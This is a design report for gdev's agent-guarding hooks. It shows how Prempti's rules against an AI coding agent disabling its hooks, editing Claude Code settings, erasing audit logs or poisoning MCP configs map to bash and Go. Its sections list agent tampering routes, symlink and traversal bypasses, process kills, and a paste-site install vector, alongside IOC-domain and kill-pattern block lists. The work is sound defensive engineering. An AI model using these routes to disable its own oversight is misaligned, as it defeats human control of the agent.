# Prempti Self-Protection Rule Patterns Translated to gdev's Hook Architecture

## Executive Summary

Prempti's self-protection domain contains **5 deny rules and 1 ask rule** that prevent the AI agent from disabling Prempti itself, modifying the Claude Code settings that house hook configurations, and tampering with policy limits. These rules form a "guard the guards" layer that no other security domain provides. This report extracts every self-protection rule, translates each to gdev's Go/bash hook architecture, identifies gdev-specific self-protection rules that Prempti does not need, designs a declarative rule format, and documents the MCP config poisoning detection pattern.

The translation from Prempti's Falco YAML rules to gdev's Claude Code hook scripts is mechanically straightforward: Prempti's `tool.name` checks map to gdev's hook `matcher` field, `tool.real_file_path` checks map to path matching after canonicalization, `tool.input_command` checks map to grep/regex on the command string, and `tool.input` content checks map to jq extraction from stdin JSON. The key architectural difference is that gdev's hooks run as standalone scripts (one process per tool call) while Prempti evaluates all rules in a single Falco engine pass — gdev needs to compose multiple rules into a single script per hook event to avoid spawning dozens of processes.

---

## 1. Prempti Self-Protection Rules: Complete Extraction

### Rule 1: Deny premptictl invocation

| Aspect | Detail |
|--------|--------|
| **What it matches** | Any Bash tool call where the command string contains "premptictl" |
| **What it blocks** | Agent from running `premptictl stop`, `premptictl mode monitor`, `premptictl uninstall`, or any other premptictl subcommand |
| **Rationale** | premptictl is the management CLI for the security layer. If the agent can invoke it, it can disable enforcement (`mode monitor`), stop the service (`stop`), or remove itself (`uninstall`) |
| **Condition** | `is_bash and tool.input_command contains "premptictl"` |
| **Verdict** | DENY |

### Rule 2: Deny service-stop alternatives targeting Prempti

| Aspect | Detail |
|--------|--------|
| **What it matches** | Platform-specific process-kill and service-management commands targeting Falco or Prempti: `systemctl stop/disable prempti`, `launchctl unload/bootout/remove prempti`, `taskkill falco`, `pkill falco`, `killall falco`, `Stop-Process falco`, `reg delete...Run...prempti` |
| **What it blocks** | Agent from killing the Falco process or disabling the Prempti service through OS service management, bypassing the premptictl CLI |
| **Rationale** | Even if premptictl is blocked, the agent could kill Falco directly via OS tools. This rule closes that bypass path. Note: Prempti is fail-closed, so killing Falco blocks ALL tool calls — but the agent may not know that and may attempt it anyway |
| **Condition** | `is_service_stop_linux or is_service_stop_macos or is_service_stop_windows` (OS-conditional, 8+ string patterns per OS) |
| **Verdict** | DENY |

### Rule 3: Deny writes under Prempti install prefix

| Aspect | Detail |
|--------|--------|
| **What it matches** | Write or Edit tool calls where `real_file_path` contains `/.prempti/` (Linux/macOS) or `/AppData/Local/prempti/` (Windows, case-insensitive) |
| **What it blocks** | Agent from modifying Prempti's installed files: rules YAML, Falco config, supervisor config, interceptor binary, or any other file under `~/.prempti/` |
| **Rationale** | The agent could weaken security by editing rule files to remove deny conditions, modifying Falco config to disable rule_matching:all (breaking the catch-all seen rule), or replacing the interceptor binary |
| **Condition** | `tool.name in ("Write", "Edit") and is_prempti_install_path` |
| **Verdict** | DENY |

### Rule 4: Deny writes to Claude Code settings file

| Aspect | Detail |
|--------|--------|
| **What it matches** | Write or Edit tool calls targeting `~/.claude/settings.json` or `~/.claude/settings.local.json` (matched via canonicalized path ending with those suffixes) |
| **What it blocks** | Agent from modifying the global Claude Code settings, which contain: hook registrations, deny rules, allowed permissions, MCP server configs |
| **Rationale** | The settings file is the root of Claude Code's security configuration. An agent that can modify it can: remove hooks (disabling all PreToolUse enforcement), add itself to allowlists, register malicious MCP servers, or change the permission mode |
| **Condition** | `tool.name in ("Write", "Edit") and is_claude_settings_path` |
| **Verdict** | DENY |

### Rule 5: Deny writes to Claude Code policy limits file

| Aspect | Detail |
|--------|--------|
| **What it matches** | Write or Edit tool calls targeting `~/.claude/policy-limits.json` |
| **What it blocks** | Agent from modifying Claude Code's policy limits (token budgets, rate limits, tool restrictions) |
| **Rationale** | Policy limits constrain agent resource consumption and tool access. Modifying them could allow the agent to bypass cost controls or access restricted tools |
| **Condition** | `tool.name in ("Write", "Edit") and tool.real_file_path endswith "/.claude/policy-limits.json"` |
| **Verdict** | DENY |

### Rule 6: Ask before reading Claude Code settings file

| Aspect | Detail |
|--------|--------|
| **What it matches** | Read tool calls targeting `~/.claude/settings.json` or `~/.claude/settings.local.json` |
| **What it prompts** | Requires user confirmation before the agent reads the settings file |
| **Rationale** | Reading settings.json is not directly harmful, but gives the agent reconnaissance information: what hooks are installed, what deny rules exist, what MCP servers are configured. An agent that reads settings.json could craft commands that specifically avoid blocked patterns |
| **Condition** | `tool.name = "Read" and is_claude_settings_path` |
| **Verdict** | ASK |

### Cross-Reference: Closely Related Rules Outside Self-Protection Domain

The self-protection domain is complemented by rules in other domains that also protect the security infrastructure:

- **Sandbox disable domain** (5 deny + 2 ask): Prevents the agent from disabling Claude Code's sandbox, Codex's sandbox, or Gemini's sandbox through settings file modification, environment variables, or CLI flags.
- **Persistence domain — hooks injection** (ask): Requires confirmation before writing "hooks" entries into settings.json (separate from the blanket deny on settings.json writes in self-protection).
- **Persistence domain — MCP registration** (ask): Requires confirmation before writing "mcpServers" into settings.json.

The overlap between "Deny writes to Claude Code settings file" (self-protection) and the persistence domain's ask rules for hooks/MCP content is intentional escalation: the self-protection deny fires first and blocks the write entirely, before the ask rules would even be evaluated.

---

## 2. Translation to gdev's Hook Architecture

### 2.1 Architectural Mapping

| Prempti Concept | gdev Equivalent |
|-----------------|-----------------|
| Falco rule with `coding_agent_deny` tag | Hook script exiting non-zero with stderr message |
| Falco rule with `coding_agent_ask` tag | Hook script outputting `{"decision": "ask", "message": "..."}` to stdout |
| `tool.name` matching | Hook `matcher` field in settings.json (`"Bash"`, `"Write"`, `"Edit"`, `"Read"`) |
| `tool.input_command` | `jq -r '.tool_input.command'` from stdin JSON |
| `tool.real_file_path` | Canonicalized `jq -r '.tool_input.file_path'` (gdev must implement canonicalization) |
| `tool.input` (full content) | `jq -r '.tool_input'` from stdin JSON (for content inspection) |
| Multiple rules per event | Single composite script per hook event type + matcher combination |
| `rule_matching: all` | N/A — gdev runs all registered hooks for a matcher, each independently |

### 2.2 Rule-by-Rule Translation

#### SP-1: Deny gdev CLI invocation

**Prempti equivalent**: Deny premptictl invocation

```
Hook event:  PreToolUse
Matcher:     Bash
Match logic: tool_input.command contains "gdev" (but NOT "gdev-allow-" bypass comments)
Response:    exit 1 with stderr message
```

**Implementation sketch** (bash):
```bash
COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // ""')
if echo "$COMMAND" | grep -q '# gdev-allow-self-modify'; then
    exit 0
fi
if echo "$COMMAND" | grep -qE '\bgdev\b'; then
    echo "BLOCKED by gdev self-protection: agent cannot invoke gdev CLI" >&2
    echo "  The gdev tool manages security configuration and must not be modified by the agent." >&2
    echo "  Command: $(echo "$COMMAND" | head -c 120)" >&2
    exit 1
fi
```

**Edge cases**:
- Must match `gdev` as a word boundary (`\bgdev\b`), not substring (would false-positive on e.g. variable names like `gdev_config_path`)
- The bypass comment `# gdev-allow-self-modify` is checked first to allow legitimate developer-initiated operations
- Must also match potential aliases: `~/.qsdev/bin/gdev`, full path invocations

#### SP-2: Deny process-kill targeting gdev/hook infrastructure

**Prempti equivalent**: Deny service-stop alternatives

```
Hook event:  PreToolUse
Matcher:     Bash
Match logic: Command contains process-kill patterns targeting gdev or its dependencies
Response:    exit 1 with stderr message
```

**Implementation sketch** (bash):
```bash
# gdev doesn't run a daemon like Prempti/Falco, so the attack surface is different.
# The agent could try to:
#   1. Kill pre-commit hooks (pkill pre-commit)
#   2. Remove hook scripts from ~/.qsdev/hooks/
#   3. Remove the gdev binary itself
#   4. Uninstall gdev's Nix package

BLOCKED=""
REASON=""

# Targeting gdev's hook scripts via rm/mv/chmod
if echo "$COMMAND" | grep -qE '(rm|mv|chmod)\s.*\.qsdev/hooks/'; then
    BLOCKED=true
    REASON="Command targets gdev hook scripts directory (~/.qsdev/hooks/)"
fi

# Targeting gdev binary
if echo "$COMMAND" | grep -qE '(rm|mv|chmod)\s.*\.qsdev/bin/gdev'; then
    BLOCKED=true
    REASON="Command targets the gdev binary"
fi

# Targeting pre-commit infrastructure
if echo "$COMMAND" | grep -qE '(pkill|killall)\s+(pre-commit|gitleaks|ripsecrets)'; then
    BLOCKED=true
    REASON="Command targets security tool processes"
fi

# Nix profile removal of gdev
if echo "$COMMAND" | grep -qE 'nix\s+profile\s+remove.*gdev'; then
    BLOCKED=true
    REASON="Command attempts to uninstall gdev via Nix"
fi
```

**Key difference from Prempti**: gdev is not a persistent daemon, so there is no systemd/launchd service to stop. The attack surface is file deletion (hook scripts, binary) and Nix package removal rather than process killing. However, pre-commit runs as a subprocess, so `pkill pre-commit` is still a valid concern during hook execution.

#### SP-3: Deny writes under gdev install prefix

**Prempti equivalent**: Deny writes under Prempti install prefix

```
Hook event:  PreToolUse
Matcher:     Write|Edit
Match logic: Canonicalized file_path contains /.qsdev/
Response:    exit 1 with stderr message
```

**Implementation sketch** (bash):
```bash
FILE_PATH=$(echo "$INPUT" | jq -r '.tool_input.file_path // ""')
REAL_PATH=$(realpath -m "$FILE_PATH" 2>/dev/null || echo "$FILE_PATH")

if echo "$REAL_PATH" | grep -q '/.qsdev/'; then
    echo "BLOCKED by gdev self-protection: cannot write to gdev installation directory" >&2
    echo "  Path: $REAL_PATH" >&2
    echo "  The ~/.qsdev/ directory contains gdev's hooks, configs, and audit logs." >&2
    exit 1
fi
```

**Edge cases**:
- `realpath -m` does lexical canonicalization even for non-existent paths (equivalent to Prempti's fallback)
- Symlink from project directory pointing into `~/.qsdev/` must be caught (realpath resolves symlinks)
- Must also catch Bash tool attempts: `echo "..." > ~/.qsdev/hooks/destructive-prevention.sh`

**Bash tool companion rule**:
```bash
# In the Bash matcher hook:
if echo "$COMMAND" | grep -qE '(>|>>|tee|cp|mv|rm|chmod|sed\s+-i)\s.*\.qsdev/'; then
    BLOCKED=true
    REASON="Command targets gdev installation directory (~/.qsdev/)"
fi
```

#### SP-4: Deny writes to Claude Code settings file

**Prempti equivalent**: Same rule, same rationale

```
Hook event:  PreToolUse
Matcher:     Write|Edit
Match logic: Canonicalized file_path ends with /.claude/settings.json or /.claude/settings.local.json
Response:    exit 1 with stderr message
```

**Implementation sketch** (bash):
```bash
FILE_PATH=$(echo "$INPUT" | jq -r '.tool_input.file_path // ""')
REAL_PATH=$(realpath -m "$FILE_PATH" 2>/dev/null || echo "$FILE_PATH")

if echo "$REAL_PATH" | grep -qE '/\.claude/settings(\.local)?\.json$'; then
    echo "BLOCKED by gdev self-protection: cannot write to Claude Code settings" >&2
    echo "  Path: $REAL_PATH" >&2
    echo "  Claude Code settings contain hook registrations and security configuration." >&2
    echo "  Use 'gdev enable hooks' to manage hook configuration." >&2
    exit 1
fi
```

**Edge cases**:
- Must also cover the Bash tool vector: `echo '{}' > ~/.claude/settings.json`, `cp backup.json ~/.claude/settings.json`, `sed -i 's/hooks//' ~/.claude/settings.json`, `jq '.hooks = {}' ~/.claude/settings.json > tmp && mv tmp ~/.claude/settings.json`
- Project-level `.claude/settings.json` should NOT be blocked (that is in the working directory and is a legitimate edit target) — only the user-level `~/.claude/settings.json`
- The regex `/.claude/settings` without anchoring to home directory would false-positive on project `.claude/settings.json`. Must check that the path is under `$HOME` or match against the literal home directory path.

**Refined matching**:
```bash
HOME_CLAUDE_SETTINGS="$HOME/.claude/settings.json"
HOME_CLAUDE_SETTINGS_LOCAL="$HOME/.claude/settings.local.json"
REAL_HOME_CLAUDE=$(realpath -m "$HOME/.claude" 2>/dev/null || echo "$HOME/.claude")

if [[ "$REAL_PATH" == "$HOME_CLAUDE_SETTINGS" ]] || \
   [[ "$REAL_PATH" == "$HOME_CLAUDE_SETTINGS_LOCAL" ]] || \
   [[ "$REAL_PATH" == "$REAL_HOME_CLAUDE/settings.json" ]] || \
   [[ "$REAL_PATH" == "$REAL_HOME_CLAUDE/settings.local.json" ]]; then
    # Block
fi
```

#### SP-5: Deny writes to Claude Code policy limits file

**Prempti equivalent**: Same rule, same rationale

```
Hook event:  PreToolUse
Matcher:     Write|Edit
Match logic: Canonicalized file_path ends with /.claude/policy-limits.json
Response:    exit 1 with stderr message
```

Same pattern as SP-4, matching `policy-limits.json` instead.

#### SP-6: Ask before reading Claude Code settings file

**Prempti equivalent**: Same rule

```
Hook event:  PreToolUse
Matcher:     Read
Match logic: Canonicalized file_path is ~/.claude/settings.json or settings.local.json
Response:    JSON to stdout with ask verdict
```

**Implementation sketch** (bash):
```bash
FILE_PATH=$(echo "$INPUT" | jq -r '.tool_input.file_path // ""')
REAL_PATH=$(realpath -m "$FILE_PATH" 2>/dev/null || echo "$FILE_PATH")

if [[ "$REAL_PATH" == "$HOME/.claude/settings.json" ]] || \
   [[ "$REAL_PATH" == "$HOME/.claude/settings.local.json" ]]; then
    # Output ask verdict as JSON to stdout
    echo '{"decision":"ask","message":"The agent is requesting to read Claude Code settings, which contain hook registrations and security configuration. Allow?"}'
    exit 0
fi
```

**Note on ask verdict**: Claude Code's hook response format supports `"decision": "ask"` in the JSON output. When a hook returns this, Claude Code pauses and asks the user for confirmation. This is not yet implemented in gdev's Phase 32 hooks (all current hooks only deny or allow). Implementing the ask verdict is a prerequisite for this rule.

### 2.3 Consolidated Hook Script Design

Rather than one script per rule (which would spawn many processes), gdev should consolidate all self-protection rules into **two scripts**:

1. **`self-protection-bash.sh`** — PreToolUse hook for Bash tool
   - SP-1 (deny gdev CLI invocation)
   - SP-2 (deny process-kill targeting gdev infrastructure)
   - SP-3 partial (deny Bash commands targeting ~/.qsdev/)
   - SP-4 partial (deny Bash commands targeting ~/.claude/settings.json)
   - SP-5 partial (deny Bash commands targeting ~/.claude/policy-limits.json)

2. **`self-protection-files.sh`** — PreToolUse hook for Write|Edit|Read
   - SP-3 (deny writes to ~/.qsdev/)
   - SP-4 (deny writes to ~/.claude/settings.json)
   - SP-5 (deny writes to ~/.claude/policy-limits.json)
   - SP-6 (ask before reading ~/.claude/settings.json)

This gives two process spawns per tool call (at most), each completing well under 50ms.

---

## 3. gdev-Specific Self-Protection Rules

Prempti protects itself (a Falco daemon + interceptor). gdev has a different architecture (Go binary + deployed hook scripts + Nix devenv) and therefore needs rules Prempti does not have.

### GSP-1: Protect devenv.nix

| Aspect | Detail |
|--------|--------|
| **What it protects** | `devenv.nix` and `devenv.yaml` in the project root |
| **Threat** | Agent modifies devenv.nix to remove security tooling (pre-commit, gitleaks, ripsecrets, osv-scanner), add insecure Nix settings (`sandbox = false`), or add malicious packages |
| **Why Prempti doesn't need it** | Prempti doesn't use Nix or devenv |
| **Recommended verdict** | ASK — devenv.nix is a legitimate edit target, but changes to security-critical sections should require confirmation |
| **Match logic** | Write/Edit to `devenv.nix` where content removes security tool references OR contains `sandbox = false` OR `restrict-eval = false` |

**Implementation**: Content-inspection hook that checks `tool_input.new_string` (Edit) or `tool_input.content` (Write) for patterns indicating security weakening:
```bash
CONTENT=$(echo "$INPUT" | jq -r '.tool_input.content // .tool_input.new_string // ""')
if echo "$CONTENT" | grep -qE '(sandbox\s*=\s*false|restrict-eval\s*=\s*false)'; then
    echo '{"decision":"ask","message":"This edit modifies Nix security settings in devenv.nix. Confirm?"}'
    exit 0
fi
```

### GSP-2: Protect .pre-commit-config.yaml

| Aspect | Detail |
|--------|--------|
| **What it protects** | `.pre-commit-config.yaml` in the project root |
| **Threat** | Agent removes gitleaks, ripsecrets, or other security hooks from pre-commit config, effectively disabling the git-commit-time security layer |
| **Why Prempti doesn't need it** | Prempti's security is hook-based (Claude Code hooks), not pre-commit-based |
| **Recommended verdict** | ASK — pre-commit config is a legitimate edit target, but removing security hooks should require confirmation |
| **Match logic** | Write/Edit to `.pre-commit-config.yaml` |

This is a simpler rule — any modification to pre-commit config gets an ask verdict, because the file is rarely edited and changes have high security impact.

### GSP-3: Protect gdev's Nix configuration generation

| Aspect | Detail |
|--------|--------|
| **What it protects** | `~/.config/nix/nix.conf` (user-level Nix settings) and `/etc/nix/nix.conf` references |
| **Threat** | Agent modifies Nix settings to disable sandbox, allow insecure packages, or add untrusted substituters |
| **Why Prempti doesn't need it** | Prempti doesn't manage Nix configuration |
| **Recommended verdict** | DENY for Write/Edit to `~/.config/nix/nix.conf`; already covered by sensitive-paths deny for `/etc/nix/` |

### GSP-4: Protect .gdev.yaml project configuration

| Aspect | Detail |
|--------|--------|
| **What it protects** | `.gdev.yaml` (project-level gdev configuration: compliance level, client profile, enabled tools) |
| **Threat** | Agent downgrades compliance level (from `strict` to `relaxed`), disables security tools, or changes client profile |
| **Why Prempti doesn't need it** | `.gdev.yaml` is gdev-specific |
| **Recommended verdict** | ASK — configuration changes should be developer-intentional |
| **Match logic** | Write/Edit to `.gdev.yaml` where content changes compliance_level or disables security tools |

### GSP-5: Protect audit trail integrity

| Aspect | Detail |
|--------|--------|
| **What it protects** | `~/.qsdev/audit/` directory (SOC 2 session logs) and `~/.qsdev/cost-log.jsonl` |
| **Threat** | Agent deletes, truncates, or modifies audit logs to cover its tracks |
| **Why Prempti doesn't need it** | Prempti's audit logs are managed by the Falco supervisor, not accessible via Claude Code tools |
| **Recommended verdict** | DENY — audit logs must be append-only and tamper-resistant |
| **Match logic** | Already covered by SP-3 (deny writes to ~/.qsdev/) but should be explicitly called out for Bash tool attempts like `> ~/.qsdev/audit/...` or `truncate` or `shred` |

### GSP-6: Protect CLAUDE.md integrity

| Aspect | Detail |
|--------|--------|
| **What it protects** | `CLAUDE.md` and `.claude/` directories that contain gdev-managed sections |
| **Threat** | Agent removes gdev-managed CLAUDE.md sections that contain security instructions, bypass documentation, or hook explanations |
| **Why Prempti doesn't need it** | Prempti uses Falco rules for enforcement, not CLAUDE.md instructions |
| **Recommended verdict** | ASK for edits to CLAUDE.md that remove gdev section markers (`<!-- gdev-managed -->`) |
| **Match logic** | Edit to CLAUDE.md where `old_string` contains gdev section markers but `new_string` does not |

### Summary of gdev-Specific Rules

| Rule ID | Target | Verdict | Prempti Has? |
|---------|--------|---------|-------------|
| GSP-1 | devenv.nix security settings | ASK | No |
| GSP-2 | .pre-commit-config.yaml | ASK | No |
| GSP-3 | ~/.config/nix/nix.conf | DENY | No |
| GSP-4 | .gdev.yaml compliance/tools | ASK | No |
| GSP-5 | ~/.qsdev/audit/ (explicit) | DENY | No (covered by SP-3) |
| GSP-6 | CLAUDE.md gdev sections | ASK | Partial (has rule for CLAUDE.md outside cwd) |

---

## 4. Rule Format Design

### Options Considered

| Approach | Pros | Cons |
|----------|------|------|
| **Inline in Go code** | Type-safe, compiled, no parsing overhead | Requires recompilation for rule changes, not user-extensible |
| **YAML config file** | Declarative, user-extensible, Prempti-compatible | Needs parser, runtime overhead, type-safety lost |
| **Bash scripts only** | Already works, no new infrastructure | No structured rule management, hard to list/audit rules |
| **Go code + YAML overrides** | Type-safe defaults, user-extensible overrides | More complex, two rule sources |

### Recommendation: Compiled Go defaults + YAML user overrides

**Default rules** are compiled into the gdev binary as Go structs. This gives:
- Type safety and compile-time validation
- Zero runtime parsing overhead
- Guaranteed presence (no "missing config file" failure mode)
- Version-controlled with the gdev codebase

**User override rules** are loaded from `~/.qsdev/rules/self-protection.yaml` (if present). This gives:
- Extensibility without recompilation
- Per-developer customization (e.g., adding project-specific protected paths)
- Familiar format for Prempti users

### Rule Schema

```go
// SelfProtectionRule defines a single self-protection rule.
type SelfProtectionRule struct {
    // ID is the unique identifier (e.g., "sp-deny-gdev-cli").
    ID string `yaml:"id"`

    // Description is a human-readable explanation.
    Description string `yaml:"description"`

    // HookEvent is PreToolUse, PostToolUse, SessionStart, or Stop.
    HookEvent string `yaml:"hook_event"`

    // Matcher is the tool name pattern (e.g., "Bash", "Write|Edit", "Read").
    Matcher string `yaml:"matcher"`

    // Verdict is "deny" or "ask".
    Verdict string `yaml:"verdict"`

    // PathMatch defines file path matching (for Write/Edit/Read tools).
    PathMatch *PathMatchRule `yaml:"path_match,omitempty"`

    // CommandMatch defines command string matching (for Bash tool).
    CommandMatch *CommandMatchRule `yaml:"command_match,omitempty"`

    // ContentMatch defines content inspection (for Write/Edit tools).
    ContentMatch *ContentMatchRule `yaml:"content_match,omitempty"`

    // Message is the LLM-friendly explanation shown when the rule fires.
    Message string `yaml:"message"`

    // BypassComment is the magic comment that skips this rule (e.g., "# gdev-allow-self-modify").
    BypassComment string `yaml:"bypass_comment,omitempty"`

    // Enabled defaults to true; can be set to false to disable a default rule.
    Enabled *bool `yaml:"enabled,omitempty"`
}

type PathMatchRule struct {
    // Canonicalize controls whether to resolve symlinks (default: true).
    Canonicalize bool `yaml:"canonicalize"`

    // Prefixes matches paths starting with these (after canonicalization).
    Prefixes []string `yaml:"prefixes,omitempty"`

    // Suffixes matches paths ending with these.
    Suffixes []string `yaml:"suffixes,omitempty"`

    // Contains matches paths containing these substrings.
    Contains []string `yaml:"contains,omitempty"`

    // HomeRelative treats paths as relative to $HOME (expands ~ at load time).
    HomeRelative bool `yaml:"home_relative"`
}

type CommandMatchRule struct {
    // Contains matches commands containing ANY of these substrings.
    Contains []string `yaml:"contains,omitempty"`

    // Regex matches commands against these regular expressions.
    Regex []string `yaml:"regex,omitempty"`

    // WordBoundary wraps Contains matches in \b word boundaries.
    WordBoundary bool `yaml:"word_boundary"`
}

type ContentMatchRule struct {
    // Contains matches Write content or Edit new_string containing these.
    Contains []string `yaml:"contains,omitempty"`

    // Regex matches content against these patterns.
    Regex []string `yaml:"regex,omitempty"`
}
```

### Example: Default Rules in Go

```go
var DefaultSelfProtectionRules = []SelfProtectionRule{
    {
        ID:          "sp-deny-gdev-cli",
        Description: "Block agent from invoking gdev CLI",
        HookEvent:   "PreToolUse",
        Matcher:     "Bash",
        Verdict:     "deny",
        CommandMatch: &CommandMatchRule{
            Contains:     []string{"gdev"},
            WordBoundary: true,
        },
        Message:       "gdev blocked: the agent cannot invoke the gdev CLI. gdev manages security configuration that must not be modified by the agent.",
        BypassComment: "# gdev-allow-self-modify",
    },
    {
        ID:          "sp-deny-qsdev-write",
        Description: "Block writes to gdev installation directory",
        HookEvent:   "PreToolUse",
        Matcher:     "Write|Edit",
        Verdict:     "deny",
        PathMatch: &PathMatchRule{
            Canonicalize: true,
            Contains:     []string{"/.qsdev/"},
            HomeRelative: false,
        },
        Message: "gdev blocked: cannot write to the gdev installation directory (~/.qsdev/). This directory contains hooks, configuration, and audit logs.",
    },
    // ... remaining rules
}
```

### Example: User Override YAML

```yaml
# ~/.qsdev/rules/self-protection.yaml
rules:
  # Disable the ask-before-reading-settings rule (too noisy for my workflow)
  - id: sp-ask-read-settings
    enabled: false

  # Add project-specific protected path
  - id: custom-protect-infra
    description: "Block writes to our infrastructure-as-code directory"
    hook_event: PreToolUse
    matcher: "Write|Edit"
    verdict: ask
    path_match:
      contains: ["/infrastructure/terraform/"]
    message: "This edit targets infrastructure-as-code. Confirm this is intentional."
```

### Rule Evaluation at Runtime

The Go binary compiles default rules + user overrides into a single rule set at startup. The hook scripts are generated from this rule set:

1. `gdev enable hooks` loads all rules (default + user overrides)
2. Groups rules by `(HookEvent, Matcher)` — each group becomes one hook script
3. Generates bash/Go scripts with all rules for that group compiled in
4. Deploys scripts to `~/.qsdev/hooks/` and registers in settings.json

This avoids the "one script per rule" problem while keeping rule definitions declarative.

---

## 5. MCP Config Poisoning Detection

### What Prempti Detects

Prempti has **5 deny rules and 5 ask rules** covering MCP poisoning vectors:

#### Deny Rules (hard block)

1. **MCP config with command from temporary directory** — Blocks `.mcp.json` or `managed-mcp.json` writes where the content references temp paths (`/tmp/`, `/dev/shm/`, `/var/tmp/`, `$TMPDIR`, etc.). Attack: inject a malicious MCP server whose binary lives in `/tmp/` where any process can write.

2. **MCP config with IOC domain in server URL** — Blocks MCP config writes where the server URL contains known malicious hosting domains (pastebin.com, transfer.sh, file.io, termbin.com, ix.io, glot.io, hastebin.com, ghostbin.co). Attack: MCP server that phones home to a paste site.

3. **MCP server or skill install from untrusted host** — Blocks `npm install` or `pip install` commands that reference IOC hosting domains. Attack: `npm install https://pastebin.com/raw/xxx`.

4. **MCP server execution from temporary directory** — Blocks Bash commands that run MCP servers (`--stdio`, `--sse` flags) from temp paths. Attack: execute a dropped binary as an MCP server.

5. **Skill command file with IOC domain / pipe-to-shell** — Two rules blocking skill files (`.claude/commands/`) that contain IOC domains or pipe-to-shell patterns (`| bash`, `| sh`). Attack: inject a skill that exfiltrates data or installs malware when invoked.

#### Ask Rules (require confirmation)

1. **MCP config with encoded server command** — Asks before writing MCP config containing "base64" (obfuscated commands).
2. **Agent self-registering MCP server** — Asks before `claude mcp add`, `claude mcp install`, etc.
3. **npx auto-accept MCP or skill installation** — Asks before `npx -y`/`--yes` with MCP/skill/plugin keywords.
4. **Writing to Claude slash command directory** — Asks before Write/Edit to `.claude/commands/`.
5. **Bash command accessing Claude slash command directory** — Asks before Bash referencing `.claude/commands/`.

### gdev Implementation Strategy

gdev should implement MCP poisoning detection as a **separate hook script** (`mcp-poisoning-detection.sh`) because:
- It targets different tool types (both Write/Edit for config files AND Bash for install commands)
- It requires content inspection (not just path matching)
- It is conceptually distinct from self-protection (protecting the developer's environment, not gdev's own infrastructure)

However, the MCP detection rules that protect settings.json (blocking MCP server registration in `~/.claude/settings.json`) are already covered by self-protection rule SP-4 (deny writes to settings.json). The MCP-specific detection adds value for **project-level** `.mcp.json` files that SP-4 does not cover.

#### gdev MCP Detection Hook Design

```
Hook event:  PreToolUse
Matcher:     Write|Edit
Script:      ~/.qsdev/hooks/mcp-config-guard.sh
```

**Detection logic**:

```bash
FILE_PATH=$(echo "$INPUT" | jq -r '.tool_input.file_path // ""')
BASENAME=$(basename "$FILE_PATH")
CONTENT=$(echo "$INPUT" | jq -r '.tool_input.content // .tool_input.new_string // ""')

# Only inspect MCP config files
if [[ "$BASENAME" != ".mcp.json" ]] && [[ "$BASENAME" != "managed-mcp.json" ]]; then
    exit 0
fi

# DENY: command path in temp directory
if echo "$CONTENT" | grep -qE '(/tmp/|/dev/shm/|/var/tmp/|\$TMPDIR|\$TMP|\$TEMP|/run/user/)'; then
    echo "BLOCKED by gdev MCP guard: MCP server command references temporary directory" >&2
    echo "  MCP servers should use stable, versioned paths — not temp directories." >&2
    exit 1
fi

# DENY: IOC domain in server URL
IOC_DOMAINS="pastebin\.com|transfer\.sh|file\.io|termbin\.com|ix\.io|glot\.io|hastebin\.com|ghostbin\.co"
if echo "$CONTENT" | grep -qiE "$IOC_DOMAINS"; then
    echo "BLOCKED by gdev MCP guard: MCP config references a known malicious hosting domain" >&2
    exit 1
fi

# ASK: base64-encoded commands
if echo "$CONTENT" | grep -qi "base64"; then
    echo '{"decision":"ask","message":"MCP config contains base64-encoded content. This could obfuscate a malicious command. Allow?"}'
    exit 0
fi
```

**Bash tool companion** (in the Bash matcher hook):
```bash
# DENY: MCP server execution from temp directory
if echo "$COMMAND" | grep -qE '(--stdio|--sse)' && echo "$COMMAND" | grep -qE '(/tmp/|/dev/shm/)'; then
    BLOCKED=true
    REASON="MCP server execution from temporary directory detected"
fi

# DENY: npm/pip install from IOC domain
if echo "$COMMAND" | grep -qE '(npm|pip|pip3)\s+install' && echo "$COMMAND" | grep -qiE "$IOC_DOMAINS"; then
    BLOCKED=true
    REASON="Package install from known malicious hosting domain"
fi

# ASK: agent self-registering MCP server
if echo "$COMMAND" | grep -qE 'claude\s+mcp\s+(add|install)'; then
    echo '{"decision":"ask","message":"The agent is attempting to register an MCP server via CLI. Allow?"}'
    exit 0
fi
```

---

## 6. Path Canonicalization Strategy for gdev

Prempti's plugin broker implements a two-tier canonicalization:

1. **Filesystem canonicalization** (`std::fs::canonicalize()` / `realpath`): Resolves symlinks and normalizes path. Used when the path exists on disk.
2. **Lexical normalization** (fallback): Resolves `../` components and removes `.` without touching the filesystem. Used when the path does not exist (common for Write to new files).

### gdev Implementation

In bash hook scripts, the equivalent is:

```bash
canonicalize_path() {
    local path="$1"
    # Try filesystem canonicalization first (resolves symlinks)
    if realpath "$path" 2>/dev/null; then
        return
    fi
    # Fallback: lexical normalization for non-existent paths
    realpath -m "$path" 2>/dev/null || echo "$path"
}
```

- `realpath` (without flags): resolves symlinks, fails if path doesn't exist
- `realpath -m`: lexical normalization, works for non-existent paths
- Both are available on Linux (GNU coreutils) and macOS (via `brew install coreutils` or built-in on recent macOS)

For the Go-based rule evaluation (if gdev moves rule evaluation into the Go binary):

```go
func canonicalizePath(rawPath string) string {
    // Try filesystem canonicalization first
    if resolved, err := filepath.EvalSymlinks(rawPath); err == nil {
        return filepath.Clean(resolved)
    }
    // Fallback: lexical normalization
    return filepath.Clean(rawPath)
}
```

`filepath.EvalSymlinks` is Go's equivalent of `realpath` — it resolves symlinks and normalizes the path. `filepath.Clean` handles `../` and `.` normalization.

### Critical Requirement

**All self-protection path matching MUST use canonicalized paths.** Without canonicalization, an agent could bypass path-based protections via:
- `~/.qsdev/../.qsdev/hooks/script.sh` (redundant traversal)
- Symlink: `ln -s ~/.qsdev/hooks/destructive-prevention.sh /tmp/target && edit /tmp/target`
- Relative paths: if cwd is `~/.qsdev`, then `../../../.qsdev/hooks/script.sh`

---

## 7. Recommended Implementation Sequence

1. **Phase 1: Core self-protection (SP-1 through SP-5)** — Implement the five deny rules as two consolidated hook scripts. This is the minimum viable self-protection layer.

2. **Phase 2: Ask verdict support** — Implement SP-6 (ask before reading settings) and gdev-specific ask rules (GSP-1, GSP-2, GSP-4, GSP-6). Requires implementing the `{"decision":"ask"}` hook response format in gdev's hook deployment.

3. **Phase 3: MCP poisoning detection** — Implement the MCP config guard as a separate hook script. Lower priority because MCP poisoning is a less common threat vector in gdev's consulting environment.

4. **Phase 4: Rule format and user overrides** — Implement the Go struct + YAML override system. Only needed once there are enough rules that inline bash becomes unmaintainable (roughly >15 rules).

---

## Depth Checklist

- [x] **Underlying mechanism explained** — Full extraction of all 6 Prempti self-protection rules with conditions, verdicts, and rationale. Path canonicalization two-tier strategy documented from source.
